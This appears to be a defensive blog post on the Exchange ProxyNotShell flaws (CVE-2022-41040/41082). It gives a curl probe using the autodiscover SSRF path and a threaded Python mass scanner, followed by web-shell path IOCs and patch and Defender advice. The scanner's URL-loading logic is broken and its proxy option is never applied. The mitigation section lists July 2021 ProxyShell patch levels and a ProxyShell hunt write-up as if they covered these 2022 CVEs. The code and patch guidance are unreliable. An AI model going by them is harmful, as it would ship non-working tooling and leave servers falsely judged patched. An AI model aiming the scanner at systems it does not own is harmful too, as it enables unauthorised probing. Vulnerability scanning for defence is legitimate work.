---
layout: defense
title: ProxyNotShell - Scan and Mitigate
---

In this post you'll find a way how to systematically find and kill possible open flanks regarding CVE-2022-41082 and CVE-2022-41040.

## How does the CVEs work?

<p align="center">
<img width=600  src="/images/ProxyNotShell.png">
</p>

In a nutshell the attack is a combination of two vulnerabilities that are chained together that can lead to serious issues if you're m$ Exchange server isn't patched.

## From PoC cURL to a mass scan Python script

Before we craft something more powerful, we need to achieve some experience on the field. The easiest option is to start with cURL:

```bash
curl "https://<url>/autodiscover/autodiscover.json?a@foo.var/owa/&Email=autodiscover/autodiscover.json?a@foo.var&Protocol=XYZ&FooProtocol=Powershell" \
-H  'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0' \
-kLo "out.txt"
```

Which leads to this output on a (potential) vulnerable Exchange Server:

<!-- cSpell:disable -->
```bash
*   Trying 1.2.3.4:443...
* Connected to 1.2.3.4 (1.2.3.4) port 443 (#0)
> GET /autodiscover/autodiscover.json?a@foo.var/owa/&Email=autodiscover/autodiscover.json?a@foo.var&Protocol=XYZ&FooProtocol=Powershell HTTP/1.1
> Host: 1.2.3.4
> Accept: */*
> User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 400
< Cache-Control: private
< Content-Length: 569
< Content-Type: application/json; charset=utf-8
< Server: Microsoft-IIS/10.0
< request-id: 919734b9-f865-5488-5b4e-bfad6f82ae72
< Alt-Svc: h3=":443",h3-29=":443"
< X-CalculatedFETarget: BYAPR06CU002.internal.outlook.com
< X-BackEndHttpStatus: 400
< X-CalculatedBETarget: PH7PR13MB4482.namprd42.PROD.OUTLOOK.COM
< X-BackEndHttpStatus: 400
< X-RUM-Validated: 1
< jsonerror: true
< X-AspNet-Version: 4.0.30319
< X-DiagInfo: PH7PR13MB4482
< X-BEServer: PH7PR13MB4482
< X-Proxy-RoutingCorrectness: 1
< X-Proxy-BackendServerStatus: 400
< X-FEProxyInfo: BL1PR13CA0291.namprd42.PROD.OUTLOOK.COM
< X-FEEFZInfo: MNZ
< X-FEServer: BYAPR06CA0042
< X-FirstHopCafeEFZ: MNZ
< X-Powered-By: ASP.NET
< X-FEServer: BL1PR13CA0291
< Date: Sat, 22 Oct 2022 21:38:40 GMT
<
* Connection #0 to host 1.2.3.4 left intact
{"ErrorCode":"ProtocolNotSupported","ErrorMessage":"The given protocol value \u0027XYZ\u0027 is not supported. Supported values are \u0027Rest,ActiveSync,Ews,Substrate,SubstrateSearchService,AutodiscoverV1,SubstrateNotificationService,OutlookMeetingScheduler,OutlookPay,Actions,Connectors,ConnectorsProcessors,ConnectorsWebhook,NotesClient,OwaPoweredExperience,ToDo,Weve,OutlookLocationsService,OutlookCloudSettingsService,OutlookTailoredExperiences,OwaPoweredExperienceV2,Speedway,SpeechAndLanguagePersonalization,SubstrateSignalService,CompliancePolicyService\u0027"}
```

Awesome - it works. With a test server in the backhand the possible status could be verified and the payload adjusted. In the result above `X-FEServer` is from special interest. With the learned things in mind we can now craft a something in python ready for perform a mass scan.

```python
import argparse, sys, requests
from urllib3 import disable_warnings
from concurrent.futures import ThreadPoolExecutor

PAYLOAD = "/autodiscover/autodiscover.json?a@foo.var/" \
          "owa/&Email=autodiscover/autodiscover.json?a@foo.var&Protocol=XYZ&FooProtocol=Powershell"

headers = {
    'User-Agent': 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0'
}


class ProxyNotShellParser(argparse.ArgumentParser):
    def error(self, message):
        sys.stderr.write('error: %s\n' % message)
        self.print_help()
        sys.exit(2)


parser = ProxyNotShellParser(prog='ProxyNotShell mass scanner',
                            description="Detect ProxyNotShell (CVE-2022-41082/CVE-2022-41040)")
parser.add_argument('-u', help='Single URL or file with a list of URLs. Required format: https://1.2.3.4')
parser.add_argument('-t', '--threads', help='Number of threads. Default=15', type=int, default=15)
parser.add_argument('-p', '--proxy', help='Send traffic through a Proxy (f.e. ZAP or Burp)',
                    nargs='?',
                    default=None,
                    const='http://127.0.0.1:8080')
args = parser.parse_args()


def write_output(url, output_name):
    with open(output_name, 'a') as out_file:
        out_file.write(url + '\n')


def check(url, url_id):
    try:
        response = requests.get("{}{}".format(url, PAYLOAD), headers=headers, verify=False, timeout=30)
    except requests.ConnectionError as e:
        print(f'[-] {url} Connection error - {e} ')
        return

    if response.status_code == 200 and 'Powershell' in response.text:
        print(f"[+] {url} is vulnerable to ProxyNotShell")
        write_output(url, 'vulnerable.txt')
    elif response.status_code != 200 and 'X-FEServer' in response.text:
        print(f'[{url_id}] {url} is potential vulnerable to ProxyNotShell')
        write_output(url, 'potential-vulnerable.txt')
    elif response.status_code == 302:
        print(f'[{url_id}] {url} is potential vulnerable to  (SSRF)')
        write_output(url, 'potential-ssrf.txt')
    elif response.status_code == 503:
        print(f'[{url_id}] {url}  NOT Vulnerable - all fine')
    else:
        print(f'[{url_id}] {url} is this really an exchange server?')


if __name__ == '__main__':

    disable_warnings()

    proxies = {} if args.proxy is None else {'http': args.proxy, 'https': args.proxy}
    urlId = 0

    try:
        with open(args.u) as url_list:
            urls = (line.strip() for line in url_list)
            urls = list(line for line in url_list if line)
            urls = list(dict.fromkeys(url_list))
            url_length = len(urls)

            if url_length > 1:
                print(f'[!] {url_length} URLs loaded')
    except:
        urls = [args.u]

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        for url in urls:
            urlId += 1
            executor.submit(check, url, urlId)
```
<!-- cSpell:enable -->

## Hunt the beast down

A great [writeup](https://www.huntress.com/blog/rapid-response-microsoft-exchange-servers-still-vulnerable-to-proxyshell-exploit) was done by huntress. Based on the write-up the following IOCs can help to justify your Splunk or Kibana queries:

<!-- cSpell:disable -->
```bash
C:\inetpub\wwwroot\aspnet_client\HWTJQDMFVMPOON.aspx
C:\inetpub\wwwroot\aspnet_client\VJRFWFCHRULT.aspx
C:\inetpub\wwwroot\aspnet_client\error.aspx
D:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\HWTJQDMFVMPOON.aspx
C:\inetpub\wwwroot\aspnet_client\nhmxea.aspx.aspx
C:\inetpub\wwwroot\aspnet_client\supp0rt.aspx
C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\d62ffcd688.aspx
C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\Current\themes\resources\zaivc.aspx
C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\415cc41ac1.aspx
C:\inetpub\wwwroot\aspnet_client\253283293.aspx
C:\inetpub\wwwroot\aspnet_client\ykmsr.aspx
C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\6514f55e1a.aspx
C:\inetpub\wwwroot\aspnet_client\KDNLIE.aspx
C:\inetpub\wwwroot\aspnet_client\VOLWMFQWPP.aspx
C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\VOLWMFQWPP.aspx
C:\inetpub\wwwroot\aspnet_client\system_web\NUQvLIoq.aspx
C:\inetpub\wwwroot\aspnet_client\shell.aspx
C:\inetpub\wwwroot\aspnet_client\updateServer.aspx
```
<!-- cSpell:enable -->

## Let's mitigate and harden the Exchange server

It is imperative that you update your Exchange servers to the latest released patches. At a minimum, please ensure that you have the July 2021 updates installed. You can view the installed hotfixes by running the command `systeminfo` in an administrative command prompt. The output in the “Hotfixes” section should include the Knowledge Base (KB) identifiers appropriate for your Exchange version, listed below.

Here is a list of patch levels and appropriate hash for MSExchangeRPC service binary to indicate fully patched as of July 2021:

<!-- cSpell:disable -->
```bash
Exchange 2019 CU10 + KB5004780 = v15.2.922.13
    - 8a103fbf4b18871c1378ef2689f0bdf062336d7e02a5f149132cdbd6121d4781
Exchange 2019 CU9 + KB5004780 = v15.2.858.15
    - c5c88f5b013711060bcf4392caebbc3996936b49c4a9b2053169d521f82010aa
Exchange 2016 CU21 + KB5004779 = v15.1.2308.14
    - 9f7f12011436c0bbf3aced5a9f0be8fc7795a00d0395bfd91ff76164e61f918d
Exchange 2016 CU20 + KB5004779 = v15.1.2242.12
    - ab767de6193c3f6dff680ab13180d33d21d67597e15362c09caf64eb8dfa2498
Exchange 2013 CU23 + KB5004778 = v15.0.1497.23
    - 20659e56c780cc96b4bca5e4bf48c812898c88cf134a84ac34033e41deee46e9
```
<!-- cSpell:enable -->

Officially [Microsoft recommends](https://www.microsoft.com/en-us/security/blog/2022/09/30/analyzing-attacks-using-the-exchange-vulnerabilities-cve-2022-41040-and-cve-2022-41082/) the following mitigation if using Microsoft 365 Defender. Therefore you're advised to follow this checklist:

* Turn on cloud-delivered protection in Microsoft Defender Antivirus or the equivalent for your antivirus product to cover rapidly evolving attacker tools and techniques. Cloud-based machine learning protections block a huge majority of new and unknown variants.
* Turn on tamper protection features to prevent attackers from stopping security services.
* Run EDR in block mode so that Microsoft Defender for Endpoint can block malicious artifacts, even when your non-Microsoft antivirus doesn’t detect the threat or when Microsoft Defender Antivirus is running in passive mode. EDR in block mode works behind the scenes to remediate malicious artifacts that are detected post-breach.
* Enable network protection to prevent applications or users from accessing malicious domains and other malicious content on the internet.
* Enable investigation and remediation in full automated mode to allow Microsoft Defender for Endpoint to take immediate action on alerts to resolve breaches, significantly reducing alert volume.
* Use device discovery to increase your visibility into your network by finding unmanaged devices on your network and onboarding them to Microsoft Defender for Endpoint.
